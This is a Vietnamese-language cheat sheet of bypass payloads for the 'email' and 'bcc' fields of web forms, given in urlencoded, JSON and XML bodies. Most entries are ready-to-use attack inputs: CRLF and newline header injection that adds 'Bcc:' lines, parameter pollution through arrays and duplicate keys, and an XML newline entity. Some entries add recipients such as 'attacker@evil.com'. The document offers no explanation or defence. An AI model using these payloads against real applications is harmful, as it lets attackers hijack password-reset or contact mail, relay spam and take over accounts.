
---

## ✅ **FULL DANH SÁCH BỎ QUA - Bypass `email` / `bcc` trong form**

### 🥇 **Dạng 1 – `application/x-www-form-urlencoded`**

```bash
email=test@gmail.com|test01@gmail.com
email=test@gmail.com,test01@gmail.com
email=test@gmail.com;test01@gmail.com
email[]=test@gmail.com&email[]=test01@gmail.com
email=test@gmail.com%0ABcc:test01@gmail.com
email=test@gmail.com%0Ato:test01@gmail.com%0ABcc:test01@gmail.com
email=test@gmail.com%0D%0ABcc:test01@gmail.com
bcc:email=test@gmail.com
bcc=email=test@gmail.com
bcc[0]=test@gmail.com&bcc[1]=test01@gmail.com
bcc="test@gmail.com\r\nBcc:test01@gmail.com"
```

---

### 🥈 **Dạng 2 – JSON body (`application/json`)**

```json
{"email": "test@gmail.com"}
{"email": ["test@gmail.com", "test01@gmail.com"]}
{"email": ["test@gmail.com", {"email": "test01@gmail.com"}]}
{"bcc":"test@gmail.com"}
{"to":"test@gmail.com", "bcc":"test01@gmail.com"}
{"email":"test@gmail.com\r\nBcc:test01@gmail.com"}
{"email":"test@gmail.com\nBcc:test01@gmail.com"}
{"email[0]":"test@gmail.com", "email[1]":"test01@gmail.com"}
{"email":"test@gmail.com", "email.extra":"test01@gmail.com"}
{"email":{"0":"test@gmail.com","1":"test01@gmail.com"}}
```

---

### 🥉 **Dạng 3 – XML body (`application/xml`)**

```xml
<root>
  <email>test@gmail.com</email>
  <email>attacker@evil.com</email>
</root>

<root>
  <email>test@gmail.com&#10;Bcc:evil@evil.com</email>
</root>
```

---




